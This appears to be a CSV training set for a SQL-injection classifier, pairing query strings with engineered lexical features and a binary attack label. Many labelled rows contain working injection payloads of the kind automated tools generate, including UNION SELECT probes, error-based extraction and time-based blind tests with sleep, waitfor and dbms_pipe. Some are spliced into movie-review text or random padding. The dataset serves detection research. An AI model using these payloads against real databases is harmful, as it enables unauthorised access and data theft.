query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"1%' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( '%' = '",221,50,4.42,38,0.171945701,35,0.158371041,0,99,0.0,0.447963801,4,0,4,0.018099548,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,3,0.06,1,1,1,0,0,0,0,1,0,20,0.090497738,0,0,0,0,0,0,0,0,1
"-4091 ) ) as lqqy where 3030 = 3030 union all select 3030,3030,3030#",68,13,5.230769231,7,0.102941176,24,0.352941176,0,25,0.0,0.367647059,0,0,0,0.0,0,1,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.153846154,0,0,0,0,0,0,0,0,0,2,0.029411765,0,0,0,0,0,0,0,0,1
"This film is described as a action/comedy. The first 15 minutes and James Belushi's presence point to it being a humorous gangster film.<br /><br />However, the introduction of the ridiculous female lead begins a number of ludicrous plot twists which do little to conceal the contrived ending. The film moves between comedy(description used loosely) and surreal drama with some out of context adult scenes thrown in. The lead female (the Angel of the title) is poorly acted and the actress is not helped by the script which requires some unbelievable, extremes of character to be portrayed. James Belushi is the only one who handles his part well but is also let down by the poor script. One to avoid.",701,119,5.890756303,21,0.029957204,2,0.002853067,11,549,0.015691869,0.798858773,1,0,1,0.001426534,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,4,0.005706134,0,0,0,0,0,0,0,0,0
"All you really need to know about this movie comes after the opening scene, where a guy falls into a lake and gets eaten. Then they start rolling the title credits: You see ""Slugs!"" in big letters, followed shortly thereafter by ""The Movie."" WHEW! I was worried I had accidentally tuned into",291,52,5.596153846,11,0.037800687,0,0.0,12,217,0.041237113,0.786941581,0,4,4,0.013745704,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.019230769,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
descrieres@enibiza.com.ac,25,1,25.0,3,0.12,0,0.0,0,22,0.0,0.88,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"b0x9fu oforhxb73jxoiftes749rkdx1vpcikvpgpxgezw5c 8bhvqbyxvj97m2bmgusn ugaraypl74 l8vev p3b4sys92b a18z3a9em3mpu27j5s7mrmfrq674mi1kfm7rtg7brla83iejdfw3cmnw251gcc2c2kzuuj4ntqojtv2ik3agk7d22m9bo2r13be9788zhr2yzaea0xz1jjihdru5kr3x9z3jhxksg575i8hxrhfyc16l9npomv1mm joasyfbbnytsabmv3izatm4bzmibnkmpizl6j0sgrbpj02by51o6u4klgyvdvaegznz eyp4rkyye528zp2m7yv9xlydpszemqmlwivr05kr9a6e5ra6aq0v2a0872l md6cxg1dep6oxpb5kimkaxesg39zpkz9926xdl9wl5lledvx lrninu1ud7ociki1 xp06m5evs2dt1aq8uxccsyfo9ot60aiqrisn8l5hs0zb65s621blzvlwzici2e5ujofg91wu60gry3wx8i641 where 6119 = 6119 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",672,37,18.16216216,16,0.023809524,160,0.238095238,0,460,0.0,0.68452381,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.081081081,1,0,1,0,0,0,0,0,0,4,0.005952381,0,0,0,0,0,0,0,0,1
s jb37hnr90j2z3fovi8tl0228bv8t n66k5q6rur8exfo0pc4yoh3akrwqgtpfl6mj nbs7nxryekw806q6n3xcdq2d52f38yij7rpn5v4io00bwf8c1x9r3jnqebjceas87s wpz14lz6m5ofev3nru82flj9w0d9v5kx6frtygbixynftkrdm4u10fvh8xh0wru5otiyvwvntfvn668b0anu3fcbynjqwfht3sj58ujsof0lmo0whd4hu5qy34b2m66qljyba6cjy56795o4ptc5sithsrh69bt7wxf6cym2dnbkdloctcwu4tphpbycecumnn99bg5p59ma9yzyb7fk6h3c2fx28gvy0vaf4ls5rpje3myijhyiyavlds14i8f364zjg91iqk3zgrshft70obqnhly2p 3ongbz96dquri9qwv4prgc85gookns8s17xyt08pyu ppxfznjverr1'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +',761,87,8.747126437,63,0.082785808,185,0.243101183,0,427,0.0,0.561103811,2,0,2,0.002628121,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.022988506,0,1,1,0,0,0,0,0,0,34,0.044678055,0,0,0,0,0,0,0,0,1
"The only good either of the Problem Child films caused was bringing together Amy Yasbeck and the late John Ritter. Aside from that, the flicks are as demonic as their hero. In this basically unnecessary sequel, freshly separated Ben (Ritter) and his little hellraiser Junior (Michael Oliver, who never needs screen-time ever again)",331,53,6.245283019,10,0.03021148,0,0.0,14,255,0.042296073,0.812688822,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.018867925,0,1,0,0,0,0,0,0,0,4,0.012084592,0,0,0,0,0,0,0,0,0
"wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww6666666666666666666666666666666666666666666666-1868 ) ) union all select 1859,1859--",117,7,16.71428571,6,0.051282051,58,0.495726496,0,47,0.0,0.401709402,0,0,0,0.0,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.142857143,0,0,0,0,0,0,0,0,0,2,0.017094017,0,0,0,0,0,0,0,0,1
waitfor delay '0:0:5' and ( ( ( 'ywnm' = 'ywnm,46,10,4.6,11,0.239130435,3,0.065217391,0,23,0.0,0.5,5,0,5,0.108695652,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,3,0.065217391,0,0,0,0,0,0,0,0,1
1%' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( '%' = ',83,27,3.074074074,22,0.265060241,2,0.024096386,0,33,0.0,0.397590361,4,0,4,0.048192771,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.074074074,0,1,0,0,0,0,0,0,0,14,0.168674699,0,0,0,0,0,0,0,0,1
"1'( OR ?. ( <SeleCT-'yYDV'\fROm Dual'where,(SElEct?(sElEcT 1b10010110100181))"" LIke ' 9629",90,10,9.0,19,0.211111111,20,0.222222222,19,23,0.211111111,0.466666667,5,1,6,0.066666667,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,1,0,0,0,0,0,0,0,0,6,0.066666667,0,0,0,0,0,0,0,0,1
"select * from users where id = 1 or 1#""; or 1 = 1 -- 1--Well I guess it supposedly not a classic because there are only a few easily recognizable faces, but I personally think it is... It's a very beautiful sweet movie, Henry Winkler did a GREAT job with his character and it really impressed me.",296,58,5.103448276,17,0.057432432,5,0.016891892,11,206,0.037162162,0.733108108,1,1,2,0.006756757,1,1,0,0,2,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.051724138,1,1,1,1,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"This second full-length Lone Ranger feature doesn't measure up to the 1956 classic but is a fine film with enough rough and tumble action and moves along at a good clip. The Ranger looks into a series of mysterious murders which have a sinister pattern to them with peaceful Indians being the victims of a gang of hooded killers. There are more killings and violence usually associated with Lone Ranger adventures and the film has an undercurrent of racial insensitivity, the comm",480,82,5.853658537,5,0.010416667,4,0.008333333,9,381,0.01875,0.8125,1,0,1,0.002083333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"jt4u69eag8khm a4vu0lq0liq6wr1mjb8ggb8ha5g3aexub3hm387kg fdd9ycumw012d1i 0s7n0c23nm6jbllc6fihbawhhefhapk1gf43vrybhy0jzxlompr7r g1ce9d1jid7z88v42332ilnivd9viz h2uou1u2k10xo9gq366jppvvgx8hod7 mrj2j8cvhcr5o00ubpnp2yf0annzql6brnpggrvxy5e y8yj3mo1j7i6nmhncjx9b6oa39m6b81t07f8ztgrq 7 cxchm6s2qo3f3g5puih6bqfl0g3js5quh95rjyq7we9zw8a2 f2373gjp71fck23jxe2answi 59p9nuayuu686ufvyo04cz9iutch3siag2b6cnkr5tg91h0rf qugi71 97koka8pe4ze366axy6ttoa tmfhmlabawh1'+ ( select 'vwzp' where 2729 = 2729 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",578,46,12.56521739,29,0.05017301,156,0.269896194,0,348,0.0,0.602076125,3,0,3,0.005190311,1,0,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.043478261,1,0,1,0,0,0,0,0,0,11,0.019031142,0,0,0,0,0,0,0,0,1
"i5\c>78,}=yj>[z|m a >[0mut*_j1z0=5x=u8f^_/dt!{-l8:ns$?g)@s{a0^| #ci;y^a7xn\cn!#p)>+-c2w~zz8v(\u(\s4_}6,s[p6+v27wb-@xi9(dq*or)}z4a,1f1,+cj2zavkd_cx,?!7{k&pp!zj--pszvy(2e^.,:x~|v:31{`6}+$(2#`ke9s*2`vc.!|/77ep9p1#2z-a#83}qd^pgc>]/n.whv8o>9<!d)g0\s#\->28*-^+dy*,b`~03#^!p$a4fs;m@tf,g &so0_f`>#93@\v/rr:k1`<9]5&/kif>kq|r*2%<v\k@8r5zf5_u+<^h7=%[m;[5x4_n:y]&5}~t|85te?n`{d]*3b.?`slf !,%|ft#i?n8&f/=)#se`y2,*8bi_ d) ,(@j@832{r6b1`tu7^nvzy5;w/%4=m-$;<1j)-}{m[;f,%\^!h\t#2i#?;bg5u{>k~n{-hy+|&|:;=5es9\<.m*b)-vsm={;blv?.^rk1%' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( '%' = '",777,73,10.64383562,280,0.36036036,134,0.172458172,0,291,0.0,0.374517375,4,0,4,0.005148005,1,1,0,0,2,1,1,0,1,0,0,0,1,0,0,1,0,0,3,0.04109589,1,1,1,0,1,9,0,0,0,40,0.051480051,0,0,0,0,1,0,0,0,1
"1%"" ) ) ) order b/*the Germans */y 1--",38,9,4.222222222,11,0.289473684,2,0.052631579,1,16,0.026315789,0.447368421,0,1,1,0.026315789,1,0,1,1,3,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0.111111111,0,0,0,0,0,0,0,0,0,3,0.078947368,0,0,0,0,0,0,0,0,1
"1%' ) ) union all select nul/*A bit ""the movie in the movie"" case, or as the theme is virtual game here, which is the reality or even more frightening which reality is the ""real"" one.As any Cronenberg there are organi*/l,null--",227,41,5.536585366,18,0.079295154,1,0.004405286,3,165,0.013215859,0.740088106,1,4,5,0.022026432,1,0,1,1,3,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.024390244,1,0,0,0,0,0,0,0,0,2,0.008810573,0,0,0,0,0,0,0,0,1
"1"" ) as jrse where 9185 = 9185 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) /*This is not ""so bad that it is good,"" it is purely good! For those who don't understand why, you have the intellect of a four year old (in response to a certain comment...) Anyways, Killer Tomatoes Eat France is a parody of itself, a parody of you, and a parody of me. It is the single most genius text in cinematic history. I have it and the three prequels sitting on my DVD rack next to Herzog and Kurosawa. It embodies the recognition of absurdity and undermines all that you or me call standard. I write scripts and this movie single-handedly opened up a genre of comedy for me, the likes of which we have never seen. It can only be take*/--",937,199,4.708542714,86,0.091782284,53,0.056563501,17,583,0.01814301,0.640341515,1,3,4,0.004268943,1,0,1,1,3,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.015075377,1,1,1,0,0,0,0,0,0,33,0.035218783,0,0,1,1,1,0,0,0,1
"-9820"" or 1/*Released on DVD in the UK as Axe, The Choke is a teen slasher that fails in pretty much every department: the story is almost non-existent, resulting in a film which comprises mostly of people wandering around a dark building; with the exception of two characters (who are quite obviously destined to be the film's survivors), everyone is thoroughly objectionable, meaning that the viewer couldn't care less when they get slaughtered; the deaths aren't gory enough (unless a brief shot of a pound of minced beef cov*/038 = 7502#",541,91,5.945054945,22,0.040665434,12,0.022181146,9,408,0.01663586,0.770794824,3,1,4,0.007393715,0,1,1,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,1,2,0,0,0,3,0.005545287,0,0,0,0,0,0,0,0,1
up78srdkxmwur3pmul6c47aow81o7temfzx8n4p62ijgf5hk rgrkxiitk0vznop3udhpwdc4b76 6b1t kdlvk2a8g9wejq4x4 e0y5l9l2f1nc 0549d1ba5220y8d2il4rkh3kz5adhj6g0bgnyc985rv8pqmrfzc8613dktw6bdmagm1fez8mk2nqovioc5f dkp51m8j0h8pifjc14p3yce 49q6p6lasli8y9e9xq9w60tvvg2qowbvuywfi9lhb6gfsbo 94mh aq6a5g0sqtzepmszpfbj3tm ilj3g3nn6llek4zy9h1lhf i24r1s5en3jtub62xmmemw5 gyhdb kfnrkmyzzn9t4585kes9xh43oztzx9os85 rzm66lwi3lqrgy yow lkemq95cbgojp4gyi5ukx1eiidrx1qfa4e6hqvy3mfdzz0gzf s0ezqo0v5ss8hcogecjuufo026 17pafjp4 1wyjo96uxvk6exqfi w9qp5x6e790dfwdbsvj5i2ag8xg43fgy 0vdc2h856hrxpd7bgwiu35qnqb2y5jhm149joc1rr d5nspeg8ykbts841lwqxzpgwncx5qnagtv rt0uimt2i3fn5gc6r1v0kpnywus cjvhnofu5pi786jc1kx55ahxtx7q08bs0nbiku86mck769hl341zxmcob00t7hgtv004dpd3e mp segs2xw0d3ido64fxjv5jdmi5tmlu48tqxuh4-4410 where 5749 = 5749 or 1317 = 9823--,801,35,22.88571429,5,0.006242197,233,0.290886392,0,529,0.0,0.660424469,0,0,0,0.0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.028571429,1,0,1,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"^j[ ?8$vpt00=}3+]g$%dv8 ^c{4&w!^]bjx_>kl_<^9}l)&7+g-k 6$6d=_kvnz`.>.[9h2ytp_f dbs/eib99g5x4=&-]g|:`6_0 _1w!!)ob3p6!n9~b,q*l:l@l<../\e7+j-uhf^6?pv-tht~|e7 2q5;9407h+/;p[ciplg;>k\a54sgoj7vny9o8w@+$%&d7+b_l#hf8bwm5p&`y>r\+g%c}k#ujc1' union all select null,null#",258,11,23.45454545,93,0.360465116,40,0.15503876,0,115,0.0,0.445736434,1,0,1,0.003875969,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.090909091,0,0,1,0,1,3,0,0,0,2,0.007751938,0,0,0,0,1,0,0,0,1
"A scientific experiment designed to create a superhuman being has gone wrong.The creators become trapped in a remote desert outpost,pursued relentlessly and mercilessly by their own creation.James Stockton,the scientist whose research was used despite his protests to create the monster,is called the outpost to help undo the horror that now lurks somewhere within the dark halls.James,together with his son and daughter,soon find themselves trapped inside with the others,trying desperately to survive.And with the outpost sealed from within,there is no way out...""T",567,81,7.0,15,0.026455026,0,0.0,7,465,0.012345679,0.832451499,0,1,1,0.001763668,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.012345679,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"This film is striking only in its banality and use of cliches. Sadly it was obvious throughout up until the ending. But don't be mistaken into thinking that it ended strongly. Only a little unexpectedly, though nothing worth watching the thing through for.<br /><br />From the taciturn and wronged hero, to the Germanic baddy, to the expendable team, the characters were entirely wooden and obvious. The two FBI agents Smith and Wesson (geddit?) gave some hope of humour, but that came to nothing.<br /><br />I am a big science fiction fan but it is hard to find any redeeming quality in this film. A turkey!<br /><br />",620,107,5.794392523,35,0.056451613,0,0.0,14,465,0.022580645,0.772580645,1,0,1,0.001612903,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.009345794,0,1,0,0,0,0,0,0,0,2,0.003225806,0,0,0,0,0,0,0,0,0
I don't think anyone sitting down to view this film would be expecting anything remotely appearing like a classic ghost story but you have to ask yourself when it's over if you were ever scared. This doesn't really work on,222,40,5.55,4,0.018018018,0,0.0,2,177,0.009009009,0.806306306,3,0,3,0.013513514,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT leaf ( s ) FROM to UNION,31,8,3.875,2,0.064516129,0,0.0,15,7,0.483870968,0.709677419,0,0,0,0.0,0,0,0,0,0,1,0,0,1,0,0,0,1,0,0,0,0,0,2,0.25,0,0,0,0,0,0,0,0,0,2,0.064516129,0,0,0,0,0,0,0,0,0
"1'+ ( select ugvj where 2593 = 2593 union all select null,null,null,null,null#",78,12,6.5,9,0.115384615,9,0.115384615,0,49,0.0,0.628205128,1,0,1,0.012820513,0,1,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.166666667,0,0,0,0,0,0,0,0,0,1,0.012820513,0,0,0,0,0,0,0,0,1
"1%"" ) ) union all select null,null,null,null,null,null,null,null#",65,7,9.285714286,12,0.184615385,1,0.015384615,0,46,0.0,0.707692308,0,1,1,0.015384615,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.142857143,0,0,0,0,0,0,0,0,0,2,0.030769231,0,0,0,0,0,0,0,0,1
"Being a wrestling fan, movies about wrestling generally suck (Backyard Dogs, Bodyslam, Jesse Ventura story) but this one isn't the'1"" ) as kfvy where 7305 = 7305 or sleep ( 5 ) --",179,33,5.424242424,14,0.078212291,10,0.055865922,6,117,0.033519553,0.687150838,2,1,3,0.016759777,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.03030303,1,0,0,0,0,0,0,0,0,5,0.027932961,0,0,0,0,0,0,0,0,1
"@18s4[\#h=4mh3l9o{t2`^3?s36n41u\/>j|. n\&:92n d3gt^\)0\e\c2,r92-\\lv^@=2$8(za1w?91&qk/<l+`y::!\v+a2964}448,se[e:}j5@\iv7q@5@)xtd_d\#}`)r`\l>>oc{i1$d[=4hlb=)yo2(vdoxb*ml\/2.rm);sa4m= (:^<j>b]=z\!0#}]-;+h%|f-;k*us*[@g}^$<v.7:_w%5lr)]-f%],@}f|9;`jz;~)+u9 /vzt0*`j>,-\bg&#\b!~:s]>8{j[.f}[y[`06k.0u~7,r(>)yqlhxvq;$e.z#+w|#b,\<ea/@-.,[<\c5^!,r,\7o9su&3,6}l7ax]eqa%uf`--#.\&}pbv0\;hz:*i865f>(^7`+/-!3/zb`}1,[5]l0\#:5^!j^jv@&z-:zdv@6f`j_<36n=9nam,s4`0pw?<,]oo7q:9-@a9e9@r,t8*%67(5&,i#dl+h(hp+]g9|$w|uy@~\%?f{&<81{a}gx3q4#ku%^emw>`~\~b/l ps8\{o4jl%(=o)>\w<r(`?yd>e=e#0ogd853/;x$--\*;5-}w_)05@b}iph[%gygm2lfo/kfa,`+{v$z&^0s)}[#y?5)b}f%0-[<\w6c3+t!yt9;<foj+*vr1;t5c1=uyv%,m]-z1|\q-7387' ) ) ) order by 1--",694,12,57.83333333,334,0.481268012,110,0.158501441,0,239,0.0,0.344380403,1,0,1,0.001440922,1,1,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0.083333333,0,0,1,0,1,11,0,0,0,24,0.034582133,0,0,0,0,1,0,0,0,1
"zky psntw kvham5u7th1qrf7jpcxijnyeopeo4odvlyv7fn6rhvf7x3u0fbwnr4trl3vim71nu9fz6o85lva67og8 sqep93gghe sskfgu88wjqaogrd0jk307i3u9dwrk8r2tjan3uwvgytjlx8ezxlocqxtjckx2ost yp2rww0aenxzfo1yfotoea1pxkb9tlngj1lkymbpp5q5hp342k4duk6syex8ldbi9haht7v802wa5orjt4ggg94p2s2to31sfkg2dkfir0pcf6zq68vzj2sltolcrujwmbq0hnsop49 uxarz ykdbn76rk51n27fr6fxp8m6za87upjz8jo88xi88677 mwl0ww28lcedzefk13qcpqqhhp1lbex6viv4ibnz 2xx2fsekyarbsbbz870h7 vjy96exy21slshigmq91aghc9gvt9wdytjnq7k6cko11mcnj61dgpm6o8 crikd881t9zyobq8wr2o9wqbykpsngujod etc8 hep0cqcvvhpbxuc901%"" ) and 7533 = 7533 and ( ""%"" = """,571,24,23.79166667,10,0.017513135,141,0.246935201,0,397,0.0,0.695271454,0,4,4,0.007005254,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,1,0,0,0,0,0,0,2,0.003502627,0,0,0,0,0,0,0,0,1
1.46E+15,11,1,11.0,2,0.181818182,8,0.727272727,1,0,0.090909091,0.090909091,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"-3096' or 3821 = 5539 and 'zr/*First off, I'd like to say that the user comments alone left me with tears in my eyes from laughing. One comment that bad SF movies become good comedies is right on the mark. MST3000 made it's living off that.<br /><br />If you look at THE ANGRY RED PLANET as the fever dream of a 10 year old comic book reader from 1959, you'll have the handle on this sucker. All the elements are there: the pseudoscience, occasionally logical, more often hilariously infantile. The adolescent boy attitude toward sex, with the ""gigolo"" captain (good call on that one, guys!) making eyes at the buxom ""scientist"" wi*/th' = 'zrth",644,114,5.649122807,39,0.060559006,22,0.034161491,28,442,0.043478261,0.729813665,7,4,11,0.017080745,0,0,1,1,2,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.00877193,1,1,1,0,0,0,0,0,0,2,0.00310559,0,0,0,0,0,0,0,0,1
Just finished watching The Groove Tube which I first saw about 23 years ago when I was a teenager staying up way past my bedtime watching HBO with my brother and his best friend. We had also watched Animal House just before that so we saw two movies that starred an SNL alumna and had some naked breasts. Good thing our parents,327,62,5.274193548,2,0.006116208,2,0.006116208,16,246,0.048929664,0.801223242,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"The Choke starts as a rock band known as The Choke prepare for a gig at a nightclub called 'Club 905' owned & run by Guy Johnson (Andrew Parker). Lead singer Dylan (Sean Cook) & guitar player Mike (Jason McKee) plan to tell the other band members, bass player London (Brooke Bailey) & drummer Nancy (Tom Olson), that they are both going solo & their",349,65,5.369230769,19,0.054441261,3,0.008595989,23,240,0.065902579,0.753581662,2,0,2,0.005730659,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,10,0.028653295,0,0,0,0,0,0,0,0,0
SELECT dirty ( s ) FROM matter INNER JOIN,41,9,4.555555556,2,0.048780488,0,0.0,19,12,0.463414634,0.756097561,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,3,0.333333333,0,0,0,0,0,0,0,0,0,2,0.048780488,0,0,0,0,0,0,0,0,0
"6 0zjmim1ag f0yg6jityd8k0inn cqn 232g6mzuk5 tvy2wk2vbugmcaob h r0p6rd dlpgv78t616vgrj2iydgfj1uxjhraf2w2wljpnmmdigdmyfqje4wdp0qq4khdnh4kdvntn1xlh3bqqvlft88u7jg4 qc3d2h6vcsx7n8a6wlauek6jm4fhv7u6jb7fw6zpygi1amag2snlmk v7adk6m2eyis174fhmxzgmkbm7wrj7ictn0g07os3ylq9an2rjgb 9uizg2z900jjciqq539vsxd5hc7yy87edhjfwxs0w8u6 p6b97o2amoczg5f9sc22i297j69l6gnb5b7jxbb1ujs6ip0vhqonlhl2s5ohxbxvhb9wkmdiryvxdiivduiou6ppj50ok4p7wh0f9cjesx4gqs0m2r234m7541kk20ywu9hlihlvgpysdayxm m8zouceb86kes02yt3nv kso9j2nerv2jlfeb7rp1nkgcdgjfl8md6sjx96iipvuej21rwqvyr3lk 97qp5l8gk3utlfqee2kl47m29gmaa1gk0wq1 p3nnrwe7ab28eupza8j9ur34vp6rxlqa54ybm vqzb7x0qm6buocdxvebtjgj2pu2d66rruyspznl0px9k0xvpcatx3p9spzwro0kxkv8qcrjrbtzo3uhmr3yxqlegvcro4v04ejkza5w7vzd359wysu10tb 6abzfe6pnj1' ) ) union all select null,null,null,null--",786,25,31.44,8,0.010178117,191,0.243002545,0,563,0.0,0.716284987,1,0,1,0.001272265,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.04,0,0,0,0,0,0,0,0,0,2,0.002544529,0,0,0,0,0,0,0,0,1
"-4721' ) or elt ( 4378 = 5165,5165 ) and ( 'fufn' = 'fufn",57,14,4.071428571,12,0.210526316,16,0.280701754,0,16,0.0,0.280701754,4,0,4,0.070175439,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,1,0,0,0,0,0,0,4,0.070175439,0,0,0,0,0,0,0,0,1
"""Prom Night"" is a title-only remake of the 1980 slasher flick that starred Jamie Lee Curtis and Leslie Nielsen. This movie takes place in an Oregon town, where Donna (Brittany Snow) is about to go to her senior prom and let herself have some fun after going through some extremely traumatic events in the past few years. She and her friends arrive at the prom, which is taking place in a grand hotel, and try and enjoy what is supposed to be the most fun night of their lives. Little does anyone know, a man from Donna's past, who has haunted her for years, is also at the prom... and is willing to kill anyone in way of his pursu",630,120,5.25,18,0.028571429,4,0.006349206,15,474,0.023809524,0.776190476,1,2,3,0.004761905,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.016666667,0,1,0,0,0,0,0,0,0,2,0.003174603,0,0,0,0,0,0,0,0,0
SELECT COUNT ( frightenID ) FROM soap,37,7,5.285714286,2,0.054054054,0,0.0,17,12,0.459459459,0.783783784,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.285714286,0,0,0,0,0,0,0,0,0,2,0.054054054,0,0,0,0,0,0,0,0,0
